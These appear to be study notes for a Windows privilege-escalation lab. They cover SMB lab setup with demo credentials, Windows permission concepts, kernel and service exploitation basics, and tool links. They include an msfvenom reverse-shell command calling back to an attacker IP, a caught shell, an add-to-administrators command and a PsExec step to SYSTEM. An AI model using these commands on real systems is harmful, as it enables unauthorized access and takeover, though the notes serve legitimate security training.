#Windows Privilege Escalation


## 1.  Setup

1. download/use the tools provided , to kali machine
2. start the smb server in kali (make sure to start in tools folder)
```bash
â”€$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
[sudo] password for kali:

```
3. [Log in as : `IEUser`]In windows machine open Powershell(run as administartor)
4. start the smb server 

    ```powershell
    PS C:\Windows\system32> Enable-WindowsOptionalFeature -Online -Featurename "SMBProtocol-Client" -All
    
    ```

4a. if the above command does'nt work(in my case) use:

```powershell
PS C:\Windows\system32>Get-WIndowsOptionalFeature -Online -FeatureName "SMB1Protocol"
```


5. Turn on optional feature by typing `optionalfeatures.exe` in powershell.
6. Enable `SMB File Sharing Support` and `SMB Direct`.
7. Restart the machine.
8. Login as IEuser and run cmd as administrator and `cd` to `Desktop`
9. copy the setup script from kali smb server

```powershell
    copy \\192.168.37.128\tools\setup.bat .
```
10. Run the setup.bat
```powershell
   .\setup.bat
```
11. Restart windows (you will see new account and PrivEsc folder in `C`): Login as User `user`  with password `password321`

IEUser - Password - `Passw0rd!`  
admin- `password123`  
user - `password321`

## 3. Privilege Escalation in Windows 

- Privilege Escalation can be simple (e.g. a kernel exploit) or requires a lot of reconnaissance on the compromised system.

- In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfigurations.

- All privilege escalations are effctively examples of access control violations.
- Access control and user permissions are intriniscally linked.
- When focusing on privilege escalations in Windows, understanding how Windows handles permissions is very important.

### 3.1 Understanding Permissions in Windows


**User Accounts**  
- User accounts are used to log into windows sysrtem.
- think of a user account as a collection of settings/preferences bound to a unique identity.
- The local `administrator` account is created by default at installation.
- Several other default user accounts may exist (e.g. `Guest`) depennding on ther version of windows. 

**Service Accounts**

- Service accounts are(somewhat obviously) used to run services in windows.
- Service accounts cannot be used to sign into a windows system.
- The ***System*** account is a default service account which has the highest privileges of any local account in windows.
- Other default service accounts include ***NETWORK SERVICE*** and ***LOCAL SERVICE***


**Groups**  
- User accounts can belong to multiple Groups, and Groups can have multiple users.Groups can even belong to other Groups.
- Groups allow for easier access control to resources, by setting up group wide permissions to all members of the group, rather than having to set the permissions individually.
- Regular groups(e.g. Administrators, Users) have a set list of members.
- Pseudo groups(e.g. "Authentication Users") have a dynamic list of members which changes based on certain ineteractions.  


**Resources**  
- In Windows, there are multiple type of resources(also known as objects):
    - Files/Directories
    - Registry entries
    - Services
- Whether a user and/or group has permission to perform a certain action on a resource depend on that resources's access control list(ACL).


**ACLs & ACEs**  
- Permissions to access a certain resource in windows are controlled by the access control list(ACL) for that resource.
- Each ACL is made up of zero or more access control entries(ACEs).
- Each ACE defines the relationship between a principle(e.g. a user, group) and a certain access right.

## 4.Spawning Administrative Shells


- If we can execute commands with admin privileges, a reverse shell generated by mesfvenom works nicely:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.37.128 LPORT=53 -f exe -o reverse.exe
```
- This reverse shell can be caught using netcat or Metasploit's own multi/handler.

1. generate reverse shell in tools directory in kali
2. copy the `reverse.exe` in windows machine
```cmd
C:\PrivEsc>copy \\192.168.37.128\tools\reverse.exe .
    (1) file(s) copied .
```
3. run the exe file from cmd
    ```cmd
    c:\PrivEsc> reverse.exe
    ```
4. reverse shell can now be seen in attcker machine(kali)
```bash
$:
connect to [192.168.37.128] from (UNKNOWN) [192.168.37.131] 50626
Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\PrivEsc>ls

```

### 4.1 RDP

Alternatively, if RDP is available(or enable it), we can add out low privileged user to the administrators group and then spawn an administarors command prompt via the GUI

```bash
net localgroup administrators <username> /add
```


## 5. Privilege Escalation tools


### 5.1 Why use Tools

- Tools allw us to automate the reconnaissance that can identify potential privilege escalations.
- While it is always important to understand what tools are doing, they are valuable in a time-limited setting, such as exam.
- We will use mostly,  `WinPEAS` and Seatbelt.

### 5.2 Admin -> System

To escalate from and admin user to full SYSTEM privileges, we can uise the `PsExec` tool from Windows Sysinternals

- usage
```bash
C:\PrivEsc: .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
```


#### 5.2.1 PowerUp & SharpUp

- PowerUp & SharpUp are very similar tools that hunt for specific privilege escalation misconfigurations.
- PowerUp: (written using powershell)
https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
- SharpUp: https://github.com/GhostPack/SharpUp
Pre-Compiled SharpUp: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe


- Limited Enumeration but good


- Running PowerUp



## 6. Kernal Expploits

- Kernals are the core of any operating system
- Think of it as a layer between application software and the actual computer hardware.
- The kernal has complete control over the operating system. Exploiting a kernal vulnerability can result in execution as the SYSTEM user.


### 6.1 Finding Kernal exploits

Finding and using kernal exploits is usually a simple process:

1. Enumerate windows version/patch level - can be found in `systeminfo`.
2. Find matching exploits in `ExploitDB`, `Github`.
3. Compile and run.

> Kernal exploits can often be unstable and may be one-shot or cause a system crash.

__Tools__
1. Windows Exploit suggester: (available in metasploit): Takes the output of `systeminfo` command and use it identify relavent exploits
2. Precompiled kernal exploits: `SecWiki`
3. Watson (Good for enumerating kernal exploits)



## 7 Service Exploits

- Services are simply programs that run in the background, accepting input or performing regualr tasks.

- If services run with `SYSTEM` privileges and are misconfigured, exploiting them may lead to command execution with `SYSTEM` privileges as well.

__Service commands :__

- Query the configuration of a service:
```bash
sc.exe qc <name>
```
- Query the current status of a service:
```bash
sc.exe query <name>
```
- Modify a configuration option of a service:
```bash
sc.exe config <name> <option>= <value>  # note space after option
```
- Start/stop a service:
```bash
net start/stop  <name>
```

### 7.1 

__Insecure service permissions__
- Each service has an ACL which defines certain servcie-specific permissions.
- Some permissions are innocuos(e.g `SERVICE_QUERY_CONFIG`, `SERVICE_QUERY_STATUS`).
- Some may be useful (e.g `SERVICE_STOP`, `SERVICE_START`).
- Some are dangerous(e.g. `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`).
